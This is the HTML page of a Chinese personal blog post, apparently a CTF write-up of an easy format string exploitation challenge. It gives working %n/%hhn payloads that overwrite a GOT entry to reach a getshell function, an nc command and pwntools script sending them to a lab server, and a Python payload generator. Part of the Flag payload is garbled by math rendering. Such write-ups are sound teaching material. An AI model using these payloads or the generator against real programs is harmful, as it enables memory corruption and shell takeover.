@@ -1,0 +1,440 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Format String bug-Easy Writeup | Reticence</title>
+<link rel="shortcut icon" href="http://127.0.0.1:8080/favicon.ico?v=1619508275369">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="http://127.0.0.1:8080/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Format String bug-Easy Writeup | Reticence - Atom Feed" href="http://127.0.0.1:8080/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?197e96d6e079d4c80f9674c92eb62002";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-90HNEFFE0M"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-90HNEFFE0M');
+</script>
+
+
+    <meta name="description" content="参考链接：https://www.freebuf.com/column/207425.html
+https://blog.csdn.net/iteye_3619/article/details/81337202
+https://www.cn..." />
+    <meta name="keywords" content="WriteUps" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="http://127.0.0.1:8080">
+  <img class="avatar" src="http://127.0.0.1:8080/images/avatar.png?v=1619508275369" alt="">
+  </a>
+  <h1 class="site-title">
+    Reticence
+  </h1>
+  <p class="site-description">
+    <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?197e96d6e079d4c80f9674c92eb62002";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          Index
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          Classification
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          Archives
+        </a>
+      
+    
+      
+        <a href="/navigator.html" class="menu">
+          Navigator
+        </a>
+      
+    
+      
+        <a href="/post/book-list" class="menu">
+          Booklist
+        </a>
+      
+    
+      
+        <a href="/post/fei-md-ge-shi-bi-ji-hui-zong" class="menu">
+          Notes
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          About
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/reticenceji" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+        <a href="https://www.zhihu.com/people/reticenceji" target="_blank">
+          <i class="ri-zhihu-line"></i>
+        </a>
+      
+    
+      
+    
+  </div>
+  <script>
+  var _hmt = _hmt || [];
+  (function() {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?197e96d6e079d4c80f9674c92eb62002";
+    var s = document.getElementsByTagName("script")[0]; 
+    s.parentNode.insertBefore(hm, s);
+  })();
+  </script>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Format String bug-Easy Writeup
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-08-04
+              </span>
+              <span>
+                10 min read
+              </span>
+              
+                <a href="http://127.0.0.1:8080/tag/4n7nIsyFy/" class="post-tag">
+                  # WriteUps
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>参考链接：https://www.freebuf.com/column/207425.html<br>
+https://blog.csdn.net/iteye_3619/article/details/81337202<br>
+https://www.cnblogs.com/ichunqiu/p/9329387.html</p>
+<h1 id="linux函数参数传递">Linux函数参数传递</h1>
+<figure data-type="image" tabindex="1"><img src="http://127.0.0.1:8080/post-images/1596605549811.png" alt="" loading="lazy"></figure>
+<center>函数调用约定</center>
+<figure data-type="image" tabindex="2"><img src="http://127.0.0.1:8080/post-images/1596605563030.png" alt="" loading="lazy"></figure>
+<center>内核接口调用约定</center>
+<figure data-type="image" tabindex="3"><img src="http://127.0.0.1:8080/post-images/1596605574284.png" alt="" loading="lazy"></figure>
+<center>用户接口调用约定</center>
+<h1 id="c语言基础">C语言基础</h1>
+<p>%s：用于输出字符串。其本质上是读取对应的参数，并作为指针解析，获取到对应地址的字符串输出。<br>
+%n：一个特殊的控制字符，会把之前输出的字符数量存到对应的地址。也就是说printf()也可以向内存里写东西。<br>
+<code>printf(&quot;abcd%n&quot;,&amp;target); //会给target赋值4</code><br>
+我要在某个函数的返回地址写入0x0804861f（getshell的地址）<br>
+<s>对于这里来说，我输入的字符串，其地址作为第一个参数。然后五个参数会在寄存器获取，我无法控制。我要控制后面的参数。</s><br>
+<s>对于printf来说，他会在rdi寻找他的第一个参数（最右边），但实际上那个地方是我的输入。</s></p>
+<h3 id="任意读和这道题目关系不大">任意读（和这道题目关系不大）</h3>
+<p><strong>由于此时我们可以通过输入来操控栈，我们可以输入一个地址，再让%s正好对应到这个地址，从而输出地址指向的字符串，实现任意地址读。</strong><br>
+<code>&gt;&gt;AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.</code>发现是第四个参数<br>
+<img src="http://127.0.0.1:8080/post-images/1596608733032.png" alt="" loading="lazy"><br>
+结合这张图，就知道为什么是第四个了。<br>
+addr里头可能会出现不可写的字符，需要用别的技巧输入。</p>
+<h3 id="任意写">任意写</h3>
+<p>这个搞清楚了任意写问题也不大了<br>
+构造<code>&gt;&gt;addr %你要写入的值-addr位数c~~ %4$n</code>可以实现</p>
+<h1 id="正确思路归纳">正确思路归纳</h1>
+<p>首先，file查看文件类型，IDA32反编译，gdb调试，objdump辅助。<br>
+发现getshell函数，位于 0x0804861f 处。要让控制流到这里。<br>
+修改GOT表，让控制流导向这个地方。<br>
+gdb调试，找到要修改的GOT表的位置，<br>
+<img src="http://127.0.0.1:8080/post-images/1596631727569.png" alt="" loading="lazy"><br>
+<img src="http://127.0.0.1:8080/post-images/1596631827661.png" alt="" loading="lazy"><br>
+先在本地用gdb修改尝试，发现拿到shell。<br>
+然后构造payload。</p>
+<h1 id="回顾总结">回顾总结</h1>
+<ol>
+<li>刚开始试图修改函数的返回地址，失败。原因是栈的位置不确定。<em>事实上现在程序的位置也是不确定的</em>，但是这道题应该是编译的时候去了随机化选项。</li>
+<li>最开始的payload是&quot;\x78\x9b\x04\x08%134514203c%4$n\n&quot;，但是这样子会输出好多好多空格，网络传输不行，而且程序还加了限时。根据参考链接的提示，修改了payload，一byte一byte来。</li>
+<li>GDB调试命令：<pre><code> 1. b *echo+60   设置断点
+ 2. b *0x80484a0 设置断点
+ 3. set *0xffffbb80=1234     修改内存
+ 4. set {char[100]}0xffffbb80= &quot;\x78\x9b\x04\x08\x79\x9b\x04\x08\x7a\x9b\x04\x08\x7b\x9b\x04\x08%15c%4$hhn%103c%5$hhn%126c%6$hhn%4c%7$hhn\n&quot;，修改一大块内存
+ 5. print *0x8049b78 打印内存的值
+ 6. r 开始跑，c 跑到下一个断点
+ 7. 回车会重复上一条命令
+</code></pre>
+</li>
+<li>PLT和GOT表，《CSAPP》上有讲。挺神奇的。</li>
+<li>打好基础知识！实践结合理论！</li>
+<li>累死我了。从早上10点左右开始，现在是晚上20点。。</li>
+<li>objdump -d 反汇编， --dynamic-syms       Display the contents of the dynamic symbol table</li>
+<li>IDApro F5反汇编</li>
+<li>主流的读写位置如下：(还不是很懂啊)<br>
+　　　　FINI_ARRAY区：程序初始化和结束需要经过这里，可以写这里的析构函数。<br>
+　　　　全局偏移表：(GOT)<br>
+　　　　全局函数指针：<br>
+　　　　atexit处理函数：<br>
+　　　　堆栈值（主要指返回地址）：<br>
+　　　　虚表指针：</li>
+</ol>
+<h1 id="flag">Flag</h1>
+<p>构造payload.txt:(虽然叫txt，但是是二进制文件！网络传输的缘故。)<br>
+&quot;\x78\x9b\x04\x08\x79\x9b\x04\x08\x7a\x9b\x04\x08\x7b\x9b\x04\x08%15c%4<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>h</mi><mi>h</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">hhn%103c%5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault">h</span><span class="mord mathdefault">n</span></span></span></span>hhn%126c%6<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>h</mi><mi>h</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">hhn%4c%7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault">h</span><span class="mord mathdefault">n</span></span></span></span>hhn\n&quot;<br>
+&quot;cat /data/flag\n&quot;<br>
+<code>nc nc 10.214.160.13 11005 &lt; payload.txt</code><br>
+拿到flag <code>AAA{what_f1ag_ls_A_g0od_flag?_qqgroup_386796080}</code></p>
+<h3 id="附思考过程以及草稿">附：思考过程以及草稿</h3>
+<p>file命令查看文件类型，ELF32位可执行文件。<br>
+载入到IDApro按F5可以反编译。</p>
+<p><s>0xffffbdec -&gt; 返回main的地址</s><br>
+<s>0xffffbbd0 -&gt; 参数开始位置</s></p>
+<p>通过计算，%135$08x，那个返回地址08048717，果然。<br>
+然后再压入的是ebp,ff859e68-c=ff859e5c<br>
+%134$08x.%135$08x.%136$08x.<br>
+%134$08p.%135$08p.%136<span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \xec at position 33: …]} 0xffffbbf0=&quot;\̲x̲e̲c̲\xbd\xff\xff%13…'>08p.
+set {char[30]} 0xffffbbf0=&quot;\xec\xbd\xff\xff%13c%4</span>n\n&quot;</p>
+<p>反编译+手工修改：</p>
+<pre><code>int echo()
+{
+	char s[512];
+	memset(s,0,512);
+	fgets(s,512,stdin);
+	printf(s);
+    return bulabula;
+}
+</code></pre>
+<p>好像shellcode不用写，里头有个getshell函数。<br>
+getshell()就在echo()的后面，<s>似乎把ret 地址覆盖成0 就OK了。</s> call压入栈中的是绝对地址。因为可能涉及段跨越。和int同理。<br>
+%135$08x 我要在这里写入 0x0804861f（134514207）</p>
+<pre><code>问题是，这个地址是随机变化的。。。不是绝对的。虽然函数的入口地址是绝对的。
+这篇文章针对的就是这个问题 https://www.jianshu.com/p/07581c898e84
+改变思路，修改GOT表，让程序在puts的时候跳到 0x0804861f.
+0x8049b78 这里存着puts函数的入口。
+payload:&quot;\x78\x9b\x04\x08%134514203c%4$n\n&quot;
+如何输入不可见字符？ 
+`nc 10.214.160.13 11005 &lt; ./payload.txt`
+猜测是超时被关闭了
+\x78\x9b\x04\x08\x79\x9b\x04\x08\x7a\x9b\x04\x08\x7b\x9b\x04\x08%15c%4$hhn %67c%5$hhn%7ec%6$hhn%4c%7$hhn\n
+
+print *0x8049b78
+set {char[100]}0xffffbbf0=&quot;\x78\x9b\x04\x08\x79\x9b\x04\x08\x7a\x9b\x04\x08\x7b\x9b\x04\x08%15c%4$hhn%103c%5$hhn%126c%6$hhn%4c%7$hhn\n&quot;
+~~对于这里来说，我输入的字符串，其地址作为第一个参数。然后五个参数会在寄存器获取，我无法控制。我要控制后面的参数。~~
+~~对于printf来说，他会在rdi寻找他的第一个参数（最右边），但实际上那个地方是我的输入。~~
+
+</code></pre>
+<h2 id="附2">附2</h2>
+<p>一个半自动的payload生成器，至少不用手算了。据说《python黑帽子》也有类似的代码？<br>
+主要是练练python。。</p>
+<pre><code>#生成FotmatString漏洞的payload
+import argparse
+import sys
+
+def w_payload(addr,value):
+	payload = ''
+	output = b''
+	#地址的payload
+	for i in range(4):
+		output = output + (i+addr).to_bytes(4,'little')
+		for j in range(4):
+			payload = payload+r&quot;\x{:x}&quot;.format((i+addr&gt;&gt;8*j)%0x100)
+	#写入值的payload
+	c = []
+	for i in range(4):
+		c.append(((value&gt;&gt;8*i)%0x100 -(16 if i==0 else c[i-1])+0x100) %0x100)
+		payload = payload+r&quot;%{:d}c&quot;.format(c[i])
+		output = output+bytes(r&quot;%{:d}c&quot;.format(c[i]),encoding='ASCII')
+	payload = payload+&quot;%()$n\n&quot;
+	output = output+b&quot;%()$n\n&quot;
+	return payload,output
+
+def r_payload(addr):
+	payload = ''
+	output =(addr).to_bytes(4,'little')
+	for i in range(4):
+		payload = payload+r&quot;\x{:x}&quot;.format((addr&gt;&gt;8*i)%0x100)
+	payload = payload+&quot;%()$s\n&quot;
+	output = output+b&quot;%()$s\n&quot;
+	return payload,output
+
+def main():
+	#参数
+	parser = argparse.ArgumentParser(description=&quot;生成存在格式化字符串漏洞程序的Payload，括号部分要自己填啦&quot;)
+	parser.add_argument('-n',action='store_true',dest='n',help='如果指定了该参数，将提供确定参数在栈中位置的Payload')
+	parser.add_argument('-a',action='store',dest='addr',help=&quot;指定写入或查看的地址,必须指定&quot;)
+	parser.add_argument('-w',action='store_true',dest='write',help='指定该参数为写入，默认是读取')
+	parser.add_argument('-v',action='store',dest='value',help=&quot;指定写入的值，如果是十六进制需要以0x开头，否则认为是十进制&quot;)
+	parser.add_argument('-f',action='store',dest='file',default='payload.obj',help=&quot;指定输出的文件名，如果是十六进制需要以0x开头，否则认为是十进制&quot;)
+	arguments = parser.parse_args()
+	
+	#数据处理
+	filename=arguments.file
+	if arguments.n:
+		payload = &quot;AAAA.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x\n&quot;
+		output = b&quot;AAAA.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x.%x%x%x%x\n&quot;
+	elif (arguments.write):
+		if (arguments.value is None or arguments.addr is None):
+			print(&quot;你需要指定写入的值-v和写入的地址-a&quot;)
+			sys.exit()
+		addr=int(arguments.addr,base=16) if arguments.addr[0:2]=='0x' else int(arguments.addr,base=10) 
+		value = int(arguments.value,base=16) if arguments.value[0:2]=='0x' else int(arguments.value,base=10) 
+		payload,output = w_payload(addr,value)
+	else:	
+		if (arguments.addr is None):
+			print(&quot;你需要指定读取的地址-a&quot;)
+			sys.exit()
+		addr=int(arguments.addr,base=16) if arguments.addr[0:2]=='0x' else int(arguments.addr,base=10) 
+		payload,output = r_payload(addr)
+
+	#输出部分
+	print(payload,end='')
+	with open(filename,'wb') as fileobj:
+		fileobj.write(output)	
+
+if __name__ == &quot;__main__&quot;:
+	main()
+</code></pre>
+<h2 id="附3pwntools的使用">附3：pwntools的使用</h2>
+<p>参考链接：https://bbs.pediy.com/thread-247217.htm</p>
+<pre><code>from pwn import *
+
+#创建一个远程连接
+c = remote('10.214.160.13',11005)
+#发送数据，sendline会自动回车
+c.sendline(&quot;\x78\x9b\x04\x08\x79\x9b\x04\x08\x7a\x9b\x04\x08\x7b\x9b\x04\x08%15c%4$hhn%103c%5$hhn%126c%6$hhn%4c%7$hhn&quot;)
+#交互式shell
+c.interactive()
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#linux%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92">Linux函数参数传递</a></li>
+<li><a href="#c%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80">C语言基础</a><br>
+*
+<ul>
+<li><a href="#%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%92%8C%E8%BF%99%E9%81%93%E9%A2%98%E7%9B%AE%E5%85%B3%E7%B3%BB%E4%B8%8D%E5%A4%A7">任意读（和这道题目关系不大）</a></li>
+<li><a href="#%E4%BB%BB%E6%84%8F%E5%86%99">任意写</a></li>
+</ul>
+</li>
+<li><a href="#%E6%AD%A3%E7%A1%AE%E6%80%9D%E8%B7%AF%E5%BD%92%E7%BA%B3">正确思路归纳</a></li>
+<li><a href="#%E5%9B%9E%E9%A1%BE%E6%80%BB%E7%BB%93">回顾总结</a></li>
+<li><a href="#flag">Flag</a><br>
+*
+<ul>
+<li><a href="#%E9%99%84%E6%80%9D%E8%80%83%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E8%8D%89%E7%A8%BF">附：思考过程以及草稿</a></li>
+<li><a href="#%E9%99%842">附2</a></li>
+<li><a href="#%E9%99%843pwntools%E7%9A%84%E4%BD%BF%E7%94%A8">附3：pwntools的使用</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="http://127.0.0.1:8080/post/linklist-writeup/">
+              <h3 class="post-title">
+                linklist Writeup
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="http://127.0.0.1:8080/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
